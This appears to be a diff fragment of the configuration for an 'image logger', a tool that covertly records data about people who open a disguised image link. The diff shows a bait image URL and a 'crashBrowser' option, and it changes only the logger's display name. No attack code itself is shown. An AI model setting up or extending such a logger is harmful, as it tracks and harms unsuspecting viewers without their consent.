@@ -14,7 +14,7 @@ config = {
     "image": "https://imgs.search.brave.com/0v4N2UE6TdzAtLSGM24rSRG25MAJaYgT9ectD9lNbpo/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly90aHVt/YnMuZHJlYW1zdGlt/ZS5jb20vYi9taWxs/aW9uZXItMjMzNDA1/MDI4LmpwZw", 
     "imageArgument": True,
 
-    "username": "CABDIOLOGGER", 
+    "username": "image logger", 
     "color": 0x00FFFF,
 
     "crashBrowser": False, 
